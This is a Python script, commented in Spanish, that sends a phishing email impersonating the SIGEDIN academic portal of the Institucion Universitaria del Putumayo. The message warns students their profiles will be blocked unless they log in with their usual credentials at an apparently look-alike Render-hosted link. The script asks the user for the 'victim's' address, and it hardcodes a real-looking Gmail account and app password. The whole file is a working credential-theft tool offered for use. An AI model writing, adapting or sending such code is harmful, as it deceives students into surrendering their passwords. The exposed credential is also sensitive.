import sys
import io
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Forzar salida estandar a UTF-8 para evitar errores en Windows
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# CONFIGURACION: Tu correo y contraseña de aplicacion de Gmail
remitente = "marlonmoncayo7474@gmail.com"
password = "jpwy hpdh lnuy tpaw"

# Enlace fijo de tu despliegue limpio en Render
ENLACE_RENDER = "https://sigedin-uniputumayo.onrender.com"

def enviar_phishing(destinatario):
    print(f"Usando enlace oficial: {ENLACE_RENDER}")

    msg = MIMEMultipart("alternative")
    msg['Subject'] = "Aviso Importante: Actualizacion de Seguridad SIGEDIN"
    msg['From'] = remitente
    msg['To'] = destinatario

    # Cuerpo del correo con el enlace directo y limpio de Render
    html = f"""
    <html>
      <body style="font-family: Arial, sans-serif; color: #1f2937;">
        <p>Estimado estudiante,</p>
        <p>La Oficina de Sistemas de la Institucion Universitaria del Putumayo informa que se ha implementado un nuevo protocolo de seguridad para el acceso al portal SIGEDIN Academico.</p>
        <p>Debido a esta actualizacion, todos los usuarios deben revalidar su cuenta antes de finalizar la semana para evitar el bloqueo temporal del perfil.</p>
        <p>Por favor, ingrese al siguiente enlace oficial de validacion:</p>
        <p style="margin: 20px 0;">
          <a href="{ENLACE_RENDER}" style="background-color: #18668f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">UniPutumayo Sigedin</a>
        </p>
        <p><em>Nota: Inicie sesion con su documento y contraseña habituales.</em></p>
        <br>
        <p>Atentamente,</p>
        <p>Soporte Tecnico - SIGEDIN Academico<br>
        Institucion Universitaria del Putumayo<br>
        Mocoa, Putumayo</p>
      </body>
    </html>
    """

    msg.attach(MIMEText(html, 'html', 'utf-8'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(str(remitente), str(password))
        server.sendmail(str(remitente), str(destinatario), msg.as_string())
        server.quit()
        print(f"¡Correo enviado con exito a {destinatario}!")
    except Exception as e:
        print(f"Error al enviar el correo: {e}")

if __name__ == "__main__":
    correo_destino = input("Ingrese el correo de la victima: ")
    enviar_phishing(correo_destino)